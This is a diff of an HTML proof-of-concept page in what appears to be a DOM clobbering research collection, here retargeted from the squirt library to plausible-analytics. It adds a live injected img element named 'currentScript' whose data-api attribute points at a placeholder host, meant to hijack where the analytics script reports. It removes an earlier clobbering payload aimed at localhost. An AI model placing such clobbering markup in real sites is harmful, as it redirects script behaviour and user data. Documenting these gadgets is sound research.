@@ -17,31 +17,27 @@
     </style>
 </head>
 <body>
-<h1>DOM Clobbering Collection - squirt</h1>
+<h1>DOM Clobbering Collection - plausible-analytics</h1>
 
 <section class="section">
   <div class="column">
   <p><span class="label">Payload</span><br><br>
-  <pre>&lt;img name=&quot;scripts&quot; src=&quot;http://localhost:9999&quot;&gt;
-&lt;img name=&quot;scripts&quot; src=&quot;http://localhost:9999&quot;&gt;</pre>
-  <img name="scripts" src="http://localhost:9999">
-<img name="scripts" src="http://localhost:9999">
+  <pre>&lt;img name=&quot;currentScript&quot; data-domain=&quot;xxx.xxx.xxx&quot; data-api=&quot;https://xxx.xxx.xxx&quot;&gt;</pre>
+  <img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">
   </div>
 </section>
 
 <section class="section">
   <div class="column">
   <p><span class="label">Library</span><br><br>
-  <pre>&lt;script&gt; window.sq = {}; &lt;/script&gt;
-&lt;script src=&quot;./squirt.js&quot;&gt;&lt;/script&gt;</pre>
-  <script> window.sq = {}; </script>
-<script src="./squirt.js"></script>
+  <pre>&lt;script defer data-domain=&quot;mydomain.com&quot; src=&quot;https://plausible.io/js/script.js&quot;&gt;&lt;/script&gt;</pre>
+  <script defer data-domain="mydomain.com" src="https://plausible.io/js/script.js"></script>
   </div>
 </section>
 
 <section class="section">
   <div class="column">
-  <a href="../stage/poc.html">Next: stage</a>
+  <a href="../plotly/poc.html">Next: plotly</a>
   </div>
 </section>
 
